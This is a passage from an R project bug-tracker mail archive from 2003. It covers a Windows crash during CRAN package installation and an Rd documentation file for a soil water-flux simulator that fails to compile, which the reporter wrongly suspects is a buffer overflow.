>>R crashes when installing package from CRAN (from the menu). The bug seems to be
>>reproducible, at least on my system:
>>
>>1. Open R
>>2. Install package from CRAN: install 1 package
>>3. Back to R: delete file ("y" at the prompt) and wait till package is fully
>>installed
>>4. Go back to the menu "Install package from CRAN" then R crashes
> 
> 
> This isn't reproducible on my system, also running XP Pro.  Can you
> reproduce on a different machine?
> 
> Duncan Murdoch
> 

I just reproduced it on a system where Win XP Pro was just installed 
(from scrash) and where I installed R for the purpose of testing the 
error. I did not install DrMingw yet and cannot give more precision. I 
am connected to the Interned with an ADSL modem.

Best,

Renaud

-- 
Dr Renaud Lancelot, vétérinaire
CIRAD, Département Elevage et Médecine Vétérinaire (CIRAD-Emvt)
Programme Productions Animales
http://www.cirad.fr/fr/pg_recherche/page.php?id=14

ISRA-LNERV                      tel    (221) 832 49 02
BP 2057 Dakar-Hann              fax    (221) 821 18 79 (CIRAD)
Senegal                         e-mail renaud.lancelot@cirad.fr


==> 3399.followup.3 <==
From ripley@stats.ox.ac.uk Fri Jul  4 20:00:53 2003
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64I0qJH009420
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 20:00:52 +0200 (MET DST)
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.12.9/8.12.9) with ESMTP id h64I0qVh021907;
	Fri, 4 Jul 2003 19:00:52 +0100 (BST)
Date: Fri, 4 Jul 2003 19:00:52 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender: ripley@gannet.stats
To: Renaud Lancelot <renaud.lancelot@cirad.fr>
cc: Duncan Murdoch <dmurdoch@pair.com>, <r-devel@stat.math.ethz.ch>,
   <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R crashes when installing package from CRAN (PR#3399)
In-Reply-To: <3F05BCC6.6080105@cirad.fr>
Message-ID: <Pine.LNX.4.44.0307041900330.15382-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

It is not reproducible on either on my XP systems, either.

On Fri, 4 Jul 2003, Renaud Lancelot wrote:

> Duncan Murdoch wrote:
> > On Fri, 4 Jul 2003 14:18:08 +0200 (MET DST), you wrote:
> > 
> > 
> >>Full_Name: Renaud Lancelot
> >>Version: 1.7.1.
> >>OS: MS Windows XP Pro
> >>Submission from: (NULL) (213.154.92.224)
> >>
> >>
> >>R crashes when installing package from CRAN (from the menu). The bug seems to be
> >>reproducible, at least on my system:
> >>
> >>1. Open R
> >>2. Install package from CRAN: install 1 package
> >>3. Back to R: delete file ("y" at the prompt) and wait till package is fully
> >>installed
> >>4. Go back to the menu "Install package from CRAN" then R crashes
> > 
> > 
> > This isn't reproducible on my system, also running XP Pro.  Can you
> > reproduce on a different machine?
> > 
> > Duncan Murdoch
> > 
> 
> I just reproduced it on a system where Win XP Pro was just installed 
> (from scrash) and where I installed R for the purpose of testing the 
> error. I did not install DrMingw yet and cannot give more precision. I 
> am connected to the Interned with an ADSL modem.
> 
> Best,
> 
> Renaud
> 
> 

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3400 *
Subject: R documentation -- buffer overflow?
From: Martin.Schlather@uni-bayreuth.de
Date: Fri, 04 Jul 2003 15:01:14 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3400 <==
From Martin.Schlather@uni-bayreuth.de Fri Jul  4 15:59:20 2003
Received: from btr0x1.rz.uni-bayreuth.de (btr0x1.rz.uni-bayreuth.de [132.180.8.29])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64DxJJH008137
	for <r-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 15:59:19 +0200 (MET DST)
Received: from uni-bayreuth.de (btgyx2.geo.uni-bayreuth.de [132.180.72.150])
	by btr0x1.rz.uni-bayreuth.de (8.12.0.Beta16/8.12.1) with ESMTP id h64DxDna013495
	for <r-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 15:59:14 +0200 (MEST)
Message-ID: <3F057A9A.6050707@uni-bayreuth.de>
Date: Fri, 04 Jul 2003 15:01:14 +0200
From: Martin.Schlather@uni-bayreuth.de
Reply-To: Martin.Schlather@uni-bayreuth.de
Organization: Univ. Bayreuth
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.4) Gecko/20010923
X-Accept-Language: en-us
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: R documentation -- buffer overflow?
Content-Type: multipart/mixed;
 boundary="------------090000060304060401040205"

This is a multi-part message in MIME format.
--------------090000060304060401040205
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit


Hi,

I have attached a larger Rd file that causes an error when
compiled by
     R CMD Rdconv -t txt xswms2d.Rd
(for example). If the size is reduced the error vanishes,
see the lines 230 and 527 in the file.

I could not find an error within my text and so my guess
is that there is some buffer overflow within the compiler.

If it is me who has caused the error please let me know --
and many apologies.

Cheers,
Martin

-- 
Martin Schlather                 email: Martin.Schlather@uni-bayreuth.de
Abteilung Bodenphysik            phone: +49 (0)921 55 2193
Univ. Bayreuth                   Fax  : +49 (0)921 55 2246
D -- 95440 Bayreuth, Germany     http://www.geo.uni-bayreuth.de/~martin/




--------------090000060304060401040205
Content-Type: text/plain;
 name="xswms2d.Rd"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="xswms2d.Rd"

% R CMD Rdconv -t txt xswms2d.Rd
\name{xswms2d}
\alias{xswms2d}
%- Also NEED an '\alias' for EACH other topic documented here.
\title{Modelling of water flux and solute transport}
\description{
  Interactive surface that is used to define a soil profile and
  to give the physical and chemical properties for each horizon.
  It simulates the water flux and solute transport using swms2d by
  J. Simunek,  T. Vogel, and M.Th. van Genuchten.
}
\usage{
xswms2d(h, xlim, ylim, step, picture=NULL,
  %## material and water flux parameters
  water=list(
    %## printing
    TPrint=500, red=4, print=1, mesh=TRUE,
    %## simulation control
    TolTh=0.0001, TolH=0.01, lWat=TRUE, dt=1,
    max.iteration=1000,  max.iter.prec=50000,
    iter.print=100, breakpoint=100,
    %## boundary conditions
    top.bound=2, top.value=0, bottom.bound=1, bottom.value=0,
  ),
  materials=list(
     thr=.02, ths=0.35, tha=0.02, thm=0.35, Alfa=0.041, n=1.964,
     Ks=0.000722, Kk=0.000695, thk=0.2875,
     first=1, second=1, angle=0, 
     Hslope=0, Hseg=-100, POptm=-25, sharpness=1, 
     Bulk.d=1500, Diffus=0, longiDisper=1, transvDisper=0.5,
     Adsorp=0.0004, SinkL1=-0.01, SinkS1=-0.01, SinkL0=0, SinkS0=0,
  ),
  model=list(model="gencauchy", param=c(-0.5, 0.25, 0, 5, 1.5, 5)),
  anisotropy=NULL,
  miller.link=function(rf) exp(sign(rf) * sqrt(abs(rf))),

  %## chemical data
  chemical=list(
     lChem=TRUE, Epsi=1, lUpW=1, lArtD=FALSE, PeCr=10, tPulse=500,
     top.bound=2, top.value=1, bottom.bound=1, bottom.value=0,
     root.uptake=0, intern.source=0,
  ),
  
  %## atmospherical data
  atmosphere=list(
     AtmInf=TRUE, tInit=0, Aqh=-.1687, Bqh=-.02674,
     hCritS=1.e30, GWL0L=ylim[2],
  ),
  atm.periods=1, 
  atm.data=c(
     end=100000000, prec=0, cPrec=0, rSoil=0, rRoot=0, 
     hCritA= 1000000, rGWL=0, GWL=0, crt=0, cht=0, 
  ),

  %## stones
  stone=list(
     %## basics
     value=NA, lambda=0,
     %## location
     no.upper=FALSE, no.lower=TRUE, no.overlap=TRUE,
     %## size 
     main.distr=rnorm, main.mean=14, main.s=0,
     sec.distr=rnorm, sec.mean=diff(ylim)/50, sec.s=diff(ylim)/400,
     phi.distr=rnorm, phi.mean=1, phi.s=0,
  ),

  %## roots
  plant.types=1,
  Kf=function(plant, dist, depth)
     rep(1, max(length(dist), length(depth))),
  beta=function(plant, dist, depth)
     rep(1, max(length(dist), length(depth))),
  root=list(
     plants.lambda=0, plants.mindist=15, mean=100, sd=10,
     %## root growth
     knot.probab=0.1, knot.mindist=6, shoots.3=0.4, shoots.4=0,
     stop.probab=function(knot, dist, m, s) 1 - exp(-m + s * dist),
     stop.m=1, stop.s=1,
     rf.link=function(v, m, s) exp(m + s * v), rf.m=0, rf.s=0,
     %## advanced root growth   
     no.own.root=TRUE, age.bonus=1.2, depth.bonus=5.2,
     side.bonus=5.1, dir.ch=3.71, dir.ch.s=0.5,
     %## water uptake / change of conductivity
     rf.Kf=FALSE, P0=-10, P2H=-200, P2L=-800, P3=-8000, r2H=0.5,
     r2L=0.1, root.condition=3, root.uptake=-150,
     ),
  %## control parameters for swms2d
  MaxIt=20, hTab=c(0.001,200), dtMinMax=c(0.01, 60), DMul=c(1.1, 0.33),
  %## menue, parameter input
  col.rect="red", col.bg="yellow", col.sep="gray", col.left="red",
  col.mid="darkgreen", col.right="darkgreen", col.line="red",
  col.txt="black", col.submenue="darkgreen", col.subord="steelblue",
  col.forbid="gray88", col.bg.forbid="lightyellow", col.flash="blue",
  ## drawing 
  col.hor=c("#000000", "#996600", "#660000",  "#CC9933", "#666600",
            "#CCCC99", "#CCCCCC", "#990000", "#FFCC00", "#FFFFCC"),
  col.draw="green", col.mess="red",
  %## images
  col.rf=paste("#", HEX[1 + rev(l.col) / 16],
                 HEX[1 + rev(l.col) \%\% 16],HEX[1 + rev(l.col) / 24],
	         HEX[1 + rev(l.col) \%\% 16],"00", sep=""),
  col.simu=paste("#0000", HEX[1 + l.col / 16],
                  HEX[1 + l.col \%\% 16], sep=""),
  %## finite element mesh
  col.mesh="blue", col.mesh.pt="green",
  upper.lim.z=1, areas=is.null(h$picture),
  PrintLevel=1, new=TRUE, X11.width=9.5, X11.height=7.5,
  update=FALSE, waterflow=FALSE,

  %## postscript output
  print.par=list(ps="sophy", height=3, titl=TRUE)   
)
}

%- maybe also 'usage' for other objects documented here.
\arguments{
  \item{h}{a list of the output format, see the Details.
    If \code{h} is given the parameters \code{xlim}, ..., \code{root}
    are ignored.
  }
  \item{xlim}{the horizontal extension of the profile, see also
    \code{picture}.  If \code{\diff(xlim)} is not an integer multiple of
    step \code{xlim[2]} is decreased accordingly.}
  \item{ylim}{the vertical extension of the profile, see also
    \code{picture}.  If \code{\diff(ylim)} is not an integer multiple of
    step \code{ylim[2]} is decreased accordingly.}
  \item{step}{the grid length for both directions.  The finite element
    method is essentially based on a quadratic mesh.}
  \item{picture}{array or file name for a digitised profile in tif or jpeg
    format; if array it must have three dimensions, where third
    dimension has 3 or 4 components (RGB or RGBA format).

    If \code{picture} is given then either \code{xlim} or
    \code{ylim} might be missing and is calculated from the other lim
    parameter and the dimension of the picture.
  }
  %
  \item{water}{[swms2d, water] list of the following components
    \itemize{
      \item{\code{TPrint}}{
      [TPrint] modelling time after which the result is printed}
      
      \item{\code{red}}{
      [size reduction] positive integer.
      to increase the simulation spead the
      size of the finite element grid can coarsened}
	
      \item{\code{print}}{
      [printed variable] one of the following
      spatial data sets are plotted:
      the water potential \eqn{H},
      discharge/recharge rates \eqn{Q} for internal sink/sources,
      the water contents \eqn{theta},
      the x-components of the Darcian flux vector vx,
      the z-components of the Darcian flux vector vz,
      or the soulte concentration}
      
      \item{\code{mesh}}{
      [show FE mesh] logical.  If \code{TRUE} the currently
      used finite element mesh in a swms2d simulation
      is shown in the upper left drawing area.}

      \item{\code{TolTh}}{
      [TolTh] maximum desired change of water content
      within one step.}
      
      \item{\code{TolH}}{
      [TolH] maximum desired change of pressure head within
      one step.}
      
      \item{\code{lWat}}{
      [LWat] logical. If \code{TRUE} transient water flow else
      steady state.}
      
      \item{\code{dt}}{
      [dt -- initial time step] initial time increment.}
      
      \item{\code{max.iteration}}{
      [max. iterations] maximum number of
      incremental time steps for coarsed finite element meshes.
      % coarsening by factor one is also possible
      Once \code{max.iteration} is reached, the current time and
      the aimed time is shown.  The user is asked whether it should be
      continued.}
      
      \item{\code{max.iter.prec}}{
      [max. iter. (precise)] same at
      \code{max.iteration} except that the value is used if the main
      menue bottom \code{precise waterflow} is pressed.}
      
      \item{\code{iter.print}}{
      [swms message, loop period] number of
      incremental time steps after which a short message of status is
      given}
      
      \item{\code{breakpoint}}{
      [swms, image, loop period] number of incremental
      time steps after which the current value of the spatial variable
      that is of interest is shown in a two dimensional plot.  If
      \code{breakpoint} is chosen appropriately the user gets the
      impression of seeing a movie.  Note that pictures are presented
      after a certain amount of iteration loops,
      so the length of the simulated time intervals between the
      pictures differ.}
      
      \item{\code{top.bound}}{
      [top] surface boundary condition: 1 (impermeable),
      2 (Dirichlet), 3 (Neumann), 4 (variable H), 5 (variable Q), or
      6 (atmospheric).  See the SWMS2D manual for details.}
      
      \item{\code{top.value}}{
      [top value] the value of the condition if
      appropriate.}
      
      \item{\code{bottom.bound}}{
      [bottom] boundary condition at the bottom:
      1 (free drainage), 2 (deep drainage), 3 (impermeable), 4 (Dirichlet), or
      5 (Neumann).  See the SWMS2D manual for details.}
      
      \item{\code{bottom.value}}{
      [bottom value] the value of the condition if
      appropriate.}
    }
  }
  %
  \item{materials}{[material (phys) / material (chem)];
    \code{thr}...\code{sharpness} are found in the menue for the physical
    properties, \code{Bulk.d}...\code{SinkS0} in the menue for chemical ones. 
    List of the following components
    %% no error occurs if the following \itemize is completely deleted
    %% (up to line 352); see also below, line 527 for an alternative part.
    \itemize{
      \item{\code{thr}}{
      [\eqn{\theta_r}{theta_r}] residual water contents
      \eqn{\theta_r}{theta_r}}
      
      \item{\code{ths}}{
      [\eqn{\theta_s}{theta_s}] staturated water contents
      \eqn{\theta_s}{theta_s}}
    
      \item{\code{tha}}{
      [\eqn{\theta_a}{theta_a}] fictious parameter
      \eqn{\theta_a\le\theta_r}{theta_a<=theta_r}, introduced
      into the van Genuchten model for more flexibility (to allow for
      a non-zero air-entry value), see page 10 of the SMWS2d manual
      for details.}
      
      \item{\code{thm}}{
      [\eqn{\theta_m}{theta_m}]
      \eqn{\theta_m\ge\theta_s}{theta_m>=theta_s}, introduced 
      into the van Genuchten model for more flexibility (to allow for
      a non-zero air-entry value)}
      
      \item{\code{Alfa}}{
      [\eqn{\alpha}{alpha}] factor \eqn{\alpha}{alpha} in
      the van Genuchten model}
      
      \item{\code{n}}{
      [\eqn{n}] exponent \eqn{n} in the van Genuchten model}
      
      \item{\code{Ks}}{
      [\eqn{K_s}] saturated hydraulic conductivity \eqn{K_s}}
      
      \item{\code{Kk}}{
      [\eqn{K_k}] non-saturated hydraulic conductivity
      \eqn{K_k} measured for some \eqn{\theta_k}{theta_k}}
      
      \item{\code{thk}}{
      [\eqn{\theta_k}{theta_k}] see \eqn{K_k}}
      %
      \item{\code{first}}{
      [1st principal comp] anisotropy parameter for the
      conductivity tensor}
      
      \item{\code{second}}{
      [2nd principal comp] anisotropy parameter for the
      conductivity tensor}
	
      \item{\code{angle}}{
      [ange (degrees)]  anisotropy parameter for the
      conductivity tensor}
      %
      \item{\code{Hslope}}{
      [intial H, slope] The initial matrix potential is
      calculated from the
      \code{miller.link}ed and then \code{millerH}-transformed
      Gaussian random field by linear transformation. \code{Hslope}
      and \code{Hseg} give the slope and the segment of that linear
      transformation.}
      
      \code{millerH}{ is here the identity, see also
      \code{\link{create.waterflow}} for \code{millerH}.}
      
      \item{\code{Hseg}}{
      [initial H, segment] see \code{Hslope}}
      
      \item{\code{POptm}}{
      [POptm (root)] highest (negative) matrix potention
      (so close to saturation) for which the water uptake is still
      optimal; see \code{root$P2H} for further information}
      
      \item{\code{sharpness}}{
      [sharpness]
      The values of a simulated subsequent horizon are obtained by a
      linear combination of a conditional simulation and an
      independent simulation.
      \code{sharpness} is the factor for the independent simuation
      and
      \eqn{\sqrt{1-\code{sharpness}^2}}{(1-\code{sharpness}^2)^{1/2}}
      the factor for the conditional simulation.
      The mean of the random field to be simulated
      has been substracted beforehand from the boundary
      conditions.}
      
      \code{sharpness}{is not used for the initial horizon, thus not
      given as a menue point in this case.}
      
      %
      \item{\code{Bulk.d}}{
      [bulk density] bulk density}
      
      \item{\code{Diffus}}{
      [diffusion] ionic diffusion coeffcient in free water}
      
      \item{\code{longiDisper}}{
      [longitud. Dispers.] longitudinal dispersivity}
      
      \item{\code{transvDisper}}{
      [transvers. Dispers.]  transverse dispersivity}
      
      \item{\code{Adsorp}}{
      [Freundlich isoth coeff.] Freundlich
      isotherm coefficient}
      
      \item{\code{SinkL1}}{
      [1st-order const./dissolved] first-order rate
      constant \eqn{\mu_w}{mu_w} for dissolved phase, see page 15 of
      the SWMS2d manuscript}
      
      \item{\code{SinkS1}}{
      [1st-order const./solid] first-order rate constant
      \eqn{\mu_s}{mu_s} for solid phase}
      
      \item{\code{SinkL0}}{
      [0-order const./dissolved] zero-order rate
      constant \eqn{\gamma_w}{gamma_w} for dissolved phase}
      
      \item{SinkS0}{
      [0-order const./solid] zero-order rate constant
      \eqn{\gamma_s}{gamma_s} for solid phase}
    }
  }
  %
 
  \item{model}{
    [structure] the covariance model for the Gaussian random
    fields used for the definition of the Miller similar media.
    See \code{\link[RandomFields]{CovarianceFct}} for details on the
    definiton of the covariance model.
    
    If the mean equals \code{NA} and if it is genuine last horizon,
    the area is interpreted as air.
  }

  
  \item{anisotropy}{
    logical or \code{NULL}. If logical it overrides the
    anisotropy condition given by model.  If \code{model} was
    anisotropic and \code{anisotropic=FALSE}, the first anisotropic
    scale parameter is used as scale for the isotropic model.
    If \code{model} is isotropic, only the representation is changed,
    and the user has the opportunity to change the values to an
    truely anisotropic model.
  }
  
  \item{miller.link}{
    function that transforms of the Gaussian
    random field to a 
    field of non-negative values.  The argument and the value are
    matrices (of the same size).  If \code{NULL} the \code{miller.link}
    is the identity.}

   %
  \item{chemical}{
    [swms2d (chem)] list of the following components
    \itemize{
      \item{\code{lChem}}{ 
      [Solute transport] logical that indicates whether solute transport should
      be modelled}
      
      \item{\code{Epsi}}{
      [scheme] temporal weighing coefficient:
      1 (explicit: weight=0), 2 (Crank-Nicholson: weight=0.5) or
      3 (implicit: weight=1)}
      
      \item{\code{lUpW}}{
      [formulation] 1 (upstream weighing formulation)
      or 2 (Galerkin formulation)}
      
      \item{\code{lArtD}}{
      [added artific. disp] logical.  If \code{TRUE}
      artificial dispersion is added to satisfy the stability
      criterion \code{PeCr}}
      
      \item{\code{PeCr}}{
      [PeCr] Stability criterion (Peclet number * Courant
      number); usually 2, but can be increase to 5 or 10;
      see page 44 of the SWMS2D manuscript.}
      
      \item{\code{tPulse}}{
      [pulse duration] time duration of the
      concentration pulse}
      %
      \item{\code{top.bound}}{
      [top] boundary condition for soil surface:
      1 (impermeable), 2 (Dirichlet), 3 (Neumann), 4 (variable
      Concentration), 5 (variable Q), 6 (atmospheric)}
      
      \item{\code{top.value}}{
      [top value] value of the boundary condition if
      appropriate}
    
      \item{\code{bottom.bound}}{
      [bottom] boundary condition for the bottom:
      1 (free drainage), 2 (deep drainage), 3 (impermeable)}
      
      \item{\code{bottom.value}}{
      [bottom value] value of the boundary condition
      if appropriate}
      
      \item{\code{root.uptake}}{
      [root uptake] -- not used yet}
      
      \item{\code{intern.source}}{
      [internal source]  -- not used yet}
      %
    }
  }
 
 %
 \item{atmosphere}{[atmosphere, control] list of the following components

==> 3400.reply.1 <==
From maechler@stat.math.ethz.ch Fri Jul  4 18:03:59 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64G3wJH008934
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 18:03:59 +0200 (MET DST)
Received: from lynne.ethz.ch (lynne [129.132.58.30])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h64G3eUu020579;
	Fri, 4 Jul 2003 18:03:41 +0200 (MEST)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id h64G3ts04020;
	Fri, 4 Jul 2003 18:03:55 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Message-ID: <16133.42346.814642.206120@gargle.gargle.HOWL>
Date: Fri, 4 Jul 2003 18:03:54 +0200
To: Martin.Schlather@uni-bayreuth.de
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] R documentation -- buffer overflow? (PR#3400)
In-Reply-To: <200307041359.h64DxLJH008141@pubhealth.ku.dk>
References: <200307041359.h64DxLJH008141@pubhealth.ku.dk>
X-Mailer: VM 7.15 under Emacs 21.3.2
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from base64 to 8bit by pubhealth.ku.dk id h64G3wJH008934


>>>>> "Martin" == Martin Schlather <Martin.Schlather@uni-bayreuth.de>
>>>>>     on Fri, 4 Jul 2003 15:59:21 +0200 (MET DST) writes:


    Martin> I have attached a larger Rd file that causes an error when

Unfortunately, attachments are always "mangled" when going
through R-bugs;  we strongly recommend to put that file on the
Net, and only send an URL to it.

    Martin> compiled by
    Martin> R CMD Rdconv -t txt xswms2d.Rd

    Martin> (for example). If the size is reduced the error vanishes,
    Martin> see the lines 230 and 527 in the file.

    Martin> I could not find an error within my text
I know how smart you are, but still, just because you didn't
find it, does not really prove ....  ;-)
see below

    Martin>  and so my guess is that there is some buffer
    Martin> overflow within the compiler.

I don't think so.  When I use cut and paste to recreate your
file,
and do (in a {t}csh; (ba|k)?sh needs another syntax)

     R CMD Rdconv --debug -t txt xswms2d.Rd >& xswms2d.txt

The resulting file becomes
----------------------------------------------------------
-- read file 'xswms2d.Rd';

-- mark_brackets:.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................

******* Syntax error: mismatched or missing brackets in
/-----

\name{xswms2d}
\alias{xswms2d}
\title{Modelling of water flux and solute transport}

<..........>
<..........>

--------------------------------------------------------------

and is even a bit larger than the original.
I can hardly believe that
  ``Syntax error: mismatched or missing brackets in ...''
is caused by a (perl) buffer overflow.

Best regards to Bayreuth, in any case
 
Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><


==> 3400.followup.1 <==
From edd@debian.org Fri Jul  4 18:58:57 2003
Received: from rwcrmhc11.comcast.net (rwcrmhc11.comcast.net [204.127.198.35])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64GwrJH009162
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 18:58:57 +0200 (MET DST)
Received: from sonny.eddelbuettel.com (eddelbuettel.com[12.250.182.80])
          by comcast.net (rwcrmhc11) with ESMTP
          id <20030704165847013007pcioe>; Fri, 4 Jul 2003 16:58:47 +0000
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.35 #1 (Debian))
	id 19YTtX-0002po-00; Fri, 04 Jul 2003 11:58:47 -0500
Date: Fri, 4 Jul 2003 11:58:47 -0500
From: Dirk Eddelbuettel <edd@debian.org>
To: maechler@stat.math.ethz.ch
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] R documentation -- buffer overflow? (PR#3400)
Message-ID: <20030704165847.GA10893@sonny.eddelbuettel.com>
References: <200307041604.h64G47JH008938@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <200307041604.h64G47JH008938@pubhealth.ku.dk>
User-Agent: Mutt/1.3.28i
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h64GwrJH009162

On Fri, Jul 04, 2003 at 06:04:07PM +0200, maechler@stat.math.ethz.ch wrote:
> I don't think so.  When I use cut and paste to recreate your
> file,
> and do (in a {t}csh; (ba|k)?sh needs another syntax)
> 
>      R CMD Rdconv --debug -t txt xswms2d.Rd >& xswms2d.txt
> 
> The resulting file becomes
> ----------------------------------------------------------
> -- read file 'xswms2d.Rd';
> 
> -- mark_brackets:............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................!
>  .............................
> 
> ******* Syntax error: mismatched or missing brackets in
> /-----
> 
> \name{xswms2d}
> \alias{xswms2d}
> \title{Modelling of water flux and solute transport}
> 
> <..........>
> <..........>
> 
> --------------------------------------------------------------
> 
> and is even a bit larger than the original.
> I can hardly believe that
>   ``Syntax error: mismatched or missing brackets in ...''
> is caused by a (perl) buffer overflow.

I played with it to, and found that commenting out a single line was enough
to trigger the fault.  And that line had no issues with brackets.

Something fishy happening here ...

Dirk

-- 
Don't drink and derive. Alcohol and analysis don't mix.


==> 3400.followup.2 <==
From Martin.Schlather@uni-bayreuth.de Fri Jul  4 19:45:05 2003
Received: from btr0x1.rz.uni-bayreuth.de (btr0x1.rz.uni-bayreuth.de [132.180.8.29])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h64Hj4JH009362
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 19:45:04 +0200 (MET DST)
Received: from uni-bayreuth.de (btgyx2.geo.uni-bayreuth.de [132.180.72.150])
	by btr0x1.rz.uni-bayreuth.de (8.12.0.Beta16/8.12.1) with ESMTP id h64Hixna017027
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jul 2003 19:45:00 +0200 (MEST)
Message-ID: <3F05AF83.5090505@uni-bayreuth.de>
Date: Fri, 04 Jul 2003 18:46:59 +0200
From: Martin.Schlather@uni-bayreuth.de
Reply-To: Martin.Schlather@uni-bayreuth.de
Organization: Univ. Bayreuth
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.4) Gecko/20010923
X-Accept-Language: en-us
MIME-Version: 1.0
To: R-bugs@biostat.ku.dk
Subject: (PR#3400)
References: <200307041359.h64DxLJH008141@pubhealth.ku.dk> <16133.42346.814642.206120@gargle.gargle.HOWL>
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit


Martin Maechler asked me to restate my problem.

Compiling the file (slightly modified w.r.t. the formerly
attached file) that can be found at
     http://www.geo.uni-bayreuth.de/~martin/filetransfer/xswms2d.Rd
terminates with the error message

******* Syntax error: mismatched or missing brackets in
/-----
  .....
\-----

when compiled by
    R CMD Rdconv -t txt xswms2d.Rd

However, the file does not cause any error after deleting the
line
      \item{a}{4}
(line 530), for example. This line is within the simple
environment
     \itemize{
       \item{a}{1} % if this line or
       \item{a}{2} % this line or
       \item{a}{3} % this line or
       \item{a}{4} % this line is deleted no error occurs
     }

Although there might be an error in my Rd code, the
appearance (or not appearance) of the error message is
surprising, and the reason for the error is not clear
from the message.
        _
platform i686-pc-linux-gnu
arch     i686
os       linux-gnu
system   i686, linux-gnu
status
major    1
minor    7.0
year     2003
month    04
day      16
language R


Cheers,
Martin


Martin Maechler wrote:

>>>>>>"Martin" == Martin Schlather <Martin.Schlather@uni-bayreuth.de>
>>>>>>    on Fri, 4 Jul 2003 15:59:21 +0200 (MET DST) writes:
>>>>>>
> 
> 
>     Martin> I have attached a larger Rd file that causes an error when
> 
> Unfortunately, attachments are always "mangled" when going
> through R-bugs;  we strongly recommend to put that file on the
> Net, and only send an URL to it.
> 
>     Martin> compiled by
>     Martin> R CMD Rdconv -t txt xswms2d.Rd
> 
>     Martin> (for example). If the size is reduced the error vanishes,
>     Martin> see the lines 230 and 527 in the file.
> 
>     Martin> I could not find an error within my text
> I know how smart you are, but still, just because you didn't
> find it, does not really prove ....  ;-)
> see below
> 
>     Martin>  and so my guess is that there is some buffer
>     Martin> overflow within the compiler.
> 
> I don't think so.  When I use cut and paste to recreate your
> file,
> and do (in a {t}csh; (ba|k)?sh needs another syntax)
> 
>      R CMD Rdconv --debug -t txt xswms2d.Rd >& xswms2d.txt
> 
> The resulting file becomes
> ----------------------------------------------------------
> -- read file 'xswms2d.Rd';
> 
> -- mark_brackets:...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
..............................
> 
> ******* Syntax error: mismatched or missing brackets in
> /-----
> 
> \name{xswms2d}
> \alias{xswms2d}
> \title{Modelling of water flux and solute transport}
> 
> <..........>
> <..........>
> 
> --------------------------------------------------------------
> 
> and is even a bit larger than the original.
> I can hardly believe that
>   ``Syntax error: mismatched or missing brackets in ...''
> is caused by a (perl) buffer overflow.
> 
> Best regards to Bayreuth, in any case
>  
> Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
> Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
> ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
> phone: x-41-1-632-3408		fax: ...-1228			<><
> 



-- 
Martin Schlather                 email: Martin.Schlather@uni-bayreuth.de
Abteilung Bodenphysik            phone: +49 (0)921 55 2193
Univ. Bayreuth                   Fax  : +49 (0)921 55 2246
D -- 95440 Bayreuth, Germany     http://www.geo.uni-bayreuth.de/~martin/





==> 3400.followup.3 <==
From ripley@stats.ox.ac.uk Fri Jul  4 20:06:43 2003
